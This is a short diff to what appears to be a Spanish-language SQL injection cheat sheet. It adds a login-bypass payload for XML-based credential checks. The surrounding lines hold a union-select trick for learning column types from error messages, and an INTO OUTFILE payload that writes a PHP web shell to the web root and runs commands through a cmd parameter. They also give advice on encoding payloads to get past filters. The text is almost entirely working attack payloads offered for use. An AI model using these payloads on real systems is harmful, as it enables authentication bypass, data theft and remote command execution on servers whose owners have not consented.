@@ -139,6 +139,9 @@ Enumeración de columnas:
 Enumeración de tipos de columnas:
 ' union select sum(COLUMNA) from TABLA -- Y dará error diciendo qué tipo de campo es
 
+Para formularios que usen XML user:pass del tipo user=X and pass=Y:
+	-> '(false) or 1=1(true) or 'a'='a(true) // and false de la pass
+
 
 ' or '1'='1 LIMIT 1 INTO OUTFILE ' /var/www/shell.php' LINES TERMINATED BY '<? system($_REQUEST['cmd']); ?>'-- (Si lo filtra hay que pasarlo a hex, base64, urlencode, ascii hex... Hasta que no lo filtre, en ese caso sin comillas)
 Se accede mediante /shell.php?cmd=comando a ejecutar
